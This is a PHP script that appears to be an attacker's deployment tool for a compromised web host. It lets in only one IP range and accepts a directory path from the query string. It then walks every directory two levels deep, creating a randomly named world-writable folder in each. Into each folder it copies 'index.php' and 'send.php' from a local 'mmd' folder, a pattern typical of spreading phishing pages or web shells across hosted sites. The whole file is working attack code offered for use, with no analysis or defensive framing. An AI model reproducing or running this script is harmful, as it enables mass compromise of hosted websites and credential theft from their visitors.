<?php
$allowedIPRange = '108.181.0.0/16';
$clientIP = $_SERVER['REMOTE_ADDR'];

// Function to check if an IP address is within a given IP range
function ipInRange($ip, $range)
{
    if (strpos($range, '/') === false) {
        $range .= '/32';
    }

    list($subnet, $bits) = explode('/', $range);
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnet &= $mask;

    return ($ip & $mask) == $subnet;
}

// Check if the client IP is within the allowed IP range
if (!ipInRange($clientIP, $allowedIPRange)) {
    header('HTTP/1.1 403 Forbidden');
    echo '403 Forbidden';
    exit;
}

/////////////Getting home dir //////////////
if (!function_exists('posix_getpwuid')) {
    if (isset($_GET["path"])) {
        $home = $_GET["path"];
    } else {
        echo getcwd();
        die("<br>posix function is not available<br>Please Input Path");
    }
} else {
    echo $_SERVER['SERVER_ADDR'];
    echo "<br>";

    if (isset($_GET["path"])) {
        $home = $_GET["path"];
    } else {
        $arr = posix_getpwuid(posix_getuid());
        $home = $arr["dir"];
    }
}

///////////Making directory & copy file//////////////  
$filepath = getcwd() . "/mmd/index.php";
$filelist = array('send.php'); // add file names to array

$dirlist = getFileList($home, TRUE, 2);
foreach ($dirlist as $alldir) {
    mkdir($alldir . "l1zvj38wubc4iyzi99i3fgmvgbdrfd", 0777, TRUE);
    foreach ($filelist as $filename) { // loop through file names array
        if (copy(getcwd() . "/mmd/" . $filename, $alldir . "l1zvj38wubc4iyzi99i3fgmvgbdrfd/" . $filename)) {
            echo $alldir . "l1zvj38wubc4iyzi99i3fgmvgbdrfd/" . $filename . "<br>";
        }
    }
    if (copy($filepath, $alldir . "l1zvj38wubc4iyzi99i3fgmvgbdrfd/index.php")) {
        echo $alldir . "l1zvj38wubc4iyzi99i3fgmvgbdrfd/index.php<br>";
    }
}

//////////////Directory scanner////////////////
function getFileList($dir, $recurse = FALSE, $depth = FALSE)
{
    $retval = [];
    if (substr($dir, -1) != "/") {
        $dir .= "/";
    }
    $d = @dir($dir) or die("Failed open directory $dir");
    while (FALSE !== ($entry = $d->read())) {
        // skip hidden files
        if ($entry[0] == ".") {
            continue;
        }
        if (is_dir("$dir$entry")) {
            $retval[] = "$dir$entry/";
            if ($recurse && is_readable("$dir$entry/")) {
                if ($depth === FALSE) {
                    $retval = array_merge($retval, getFileList("$dir$entry/", TRUE));
                } elseif ($depth > 0) {
                    $retval = array_merge($retval, getFileList("$dir$entry/", TRUE, $depth - 1));
                }
            }
        }
    }
    $d->close();

    return $retval;
}
?>